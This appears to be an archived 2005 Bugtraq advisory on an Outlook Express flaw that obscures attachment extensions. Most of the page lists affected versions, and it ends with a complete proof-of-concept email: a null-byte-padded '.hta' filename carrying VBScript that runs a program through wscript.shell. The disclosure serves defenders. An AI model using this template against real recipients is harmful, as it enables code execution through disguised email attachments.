#SpeeDr00t@Black Falcon<br>#bid13837<p><b><span style="font-size: 18pt;">Microsoft Outlook Express Attachment Processing File Extension Obfuscation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/13837/info">info</a><br><a href="http://www.securityfocus.com/bid/13837/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/13837/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/13837/solution">solution</a><br><a href="http://www.securityfocus.com/bid/13837/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
<table border="0" cellpadding="4" cellspacing="0">
<tr>
<td>
<span class="label">Bugtraq ID:</span>
</td>
<td>
				13837
			</td>
</tr>
<tr>
<td>
<span class="label">Class:</span>
</td>
<td>
				Failure to Handle Exceptional Conditions
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">CVE:</span>
</td>
<td>
</td>
</tr>
<tr>
<td>
<span class="label">Remote:</span>
</td>
<td>
				Yes
			</td>
</tr>
<tr>
<td>
<span class="label">Local:</span>
</td>
<td>
				No
			</td>
</tr>
<tr>
<td>
<span class="label">Published:</span>
</td>
<td>
				Jun 01 2005 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Updated:</span>
</td>
<td>
				Jun 01 2005 12:00AM
			</td>
</tr>
<tr>
<td>
<span class="label">Credit:</span>
</td>
<td>
				Discovery of this issue is credited to "Benjamin Tobias Franz" &lt;0-1-2-3@gmx.de&gt;.
			</td>
</tr>
<tr valign="top">
<td>
<span class="label">Vulnerable:</span>
</td>
<td>
				
					Microsoft Outlook Express 5.0.1 <br/>
					
				
					Microsoft Outlook Express 4.72.3612 <br/>
					
				
					Microsoft Outlook Express 4.72.3120 <br/>
					
				
					Microsoft Outlook Express 4.72.2106 <br/>
					
				
					Microsoft Outlook Express 4.27.3110 <br/>
					
				
					Microsoft Outlook Express 4.0.1 SP2<br/>
					
				
					Microsoft Outlook Express  6.0 SP1<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows XP 64-bit Edition  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP 64-bit Edition  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  SP1<br/>
</span>
					
				
					Microsoft Outlook Express  6.0<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Datacenter Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Enterprise Edition Itanium  0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Itanium  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Itanium  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Itanium  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Itanium  SP1<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard x64 Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Standard x64 Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 Web Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 x64  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows Server 2003 x64  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP 64-bit Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP 64-bit Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Home  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Media Center Edition  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Media Center Edition  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Media Center Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Media Center Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Media Center Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional x64 Edition  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Professional x64 Edition  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Tablet PC Edition  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Tablet PC Edition  SP2<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Tablet PC Edition  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows XP Tablet PC Edition  <br/>
</span>
					
				
					Microsoft Outlook Express  5.5 SP2<br/>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Advanced Server  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Advanced Server  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Advanced Server  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Advanced Server  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Datacenter Server  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Datacenter Server  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Datacenter Server  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Datacenter Server  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Professional  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Professional  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Professional  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Professional  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Server  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Server  SP4<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Server  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows 2000 Server  SP3<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows ME  <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Windows ME  <br/>
</span>
					
				
					Microsoft Outlook Express  5.5 SP1<br/>
					
				
					Microsoft Outlook Express  5.5<br/>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows NT 4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows NT 4.0<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows 98<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows 98<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows 95<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows 95<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows 2000<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 for Windows 2000<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer 5.0.1 <br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  5.5<br/>
</span>
<span class="related">
						
							+ 
						
						Microsoft Internet Explorer  5.5<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 2000 Professional  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 95  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 95  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows 98SE  <br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
<span class="related">
						
							-
						
						Microsoft Windows NT  4.0<br/>
</span>
					
				
					Microsoft Outlook Express  5.0<br/>
					
				
					Microsoft Outlook Express  4.0<br/>
</td>
</tr>
<tr>
<td colspan="2">
<div class="breakline"></div>
</td>
</tr>
<tr valign="top">
<td>
<span class="label">Not Vulnerable:</span>
</td>
<td>
</td>
</tr>
</table>
</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
<span class="title"></span><br/><br/>
	The following proof of concept is available:<br/><br/>===&gt;&gt;&gt; PoC - Start &lt;&lt;&lt;===<br/>From:"Benjamin Tobias Franz"&lt;0-1-2-3@gmx.de&gt;<br/>To:You<br/>Subject:MSOE - Attachment Download Security Restriction Bypass<br/>Date:Wed, 1 Jun 2005<br/>Content-Type:multipart/mixed;boundary="btf"<br/><br/>--btf<br/>Content-Type: text/plain;<br/><br/>Open the attachment and you will see:<br/>MS OE will not show the correct warning message (for software)<br/>and not the type of the file.<br/><br/><br/>Regards,<br/><br/>Benjamin Tobias Franz<br/>Germany<br/>--btf<br/>Content-Type:message/rfc822<br/>Content-Transfer-Encoding:quoted-printable<br/><br/>&lt;!--<br/>Subject:BTF's MSOE Attachment Download Security Restriction Bypass=<br/>.hta=00.btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf=<br/>btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf=<br/>btfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtfbtf=<br/>btfbtf<br/>--&gt;<br/>&lt;title&gt;YOU ARE VULNERABLE&lt;/title&gt;<br/>&lt;script language=3Dvbscript&gt;set btf=3Dcreateobject("wscript.shell")=<br/>:btf.run("calc")&lt;/script&gt;&lt;body style=3D"background-color:red;font-si=<br/>ze:40px;"&gt;&lt;b&gt;YOU ARE VULNERABLE!!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;Regards,&lt;br&gt;&lt;br&gt;<br/>Benjamin Tobias Franz&lt;br&gt;Germany&lt;/body&gt;<br/>--btf--<br/><br/>===&gt;&gt;&gt; PoC - End &lt;&lt;&lt;===
	
		<ul>
</ul>
</div>